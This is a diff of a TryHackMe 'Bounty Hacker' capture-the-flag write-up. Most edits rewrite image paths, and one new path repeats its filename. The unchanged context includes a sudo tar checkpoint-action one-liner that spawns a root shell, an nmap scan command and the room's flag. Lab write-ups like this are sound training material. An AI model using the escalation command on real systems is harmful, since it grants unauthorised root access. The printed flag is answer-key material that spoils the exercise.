@@ -217,7 +217,7 @@ User lin may run the following commands on bountyhacker:
     (root) /bin/tar
 ```
 19. `firefox "https://gtfobins.github.io/gtfobins/tar/"`
-![](https://github.com/KnowCybersecurity/TryHackMe-CTF-Writeups/blob/main/Assets/THM%20-%20Bounty%20Hacker/GTFOBins%20Tar.png)
+![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Bounty%20Hacker/GTFOBins%20Tar.pngGTFOBins%20Tar.png)
 20. `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
 21. `whoami`
 ```bash
@@ -241,7 +241,7 @@ THM{80UN7Y_h4cK3r}
 ```
 
 **Room completed!**
-![](https://github.com/KnowCybersecurity/TryHackMe-CTF-Writeups/blob/main/Assets/TryHackMe%20-%20Bounty%20Hacker.png)
+![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/TryHackMe%20-%20Bounty%20Hacker.png)
 
 # Command History
 1. `nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt`
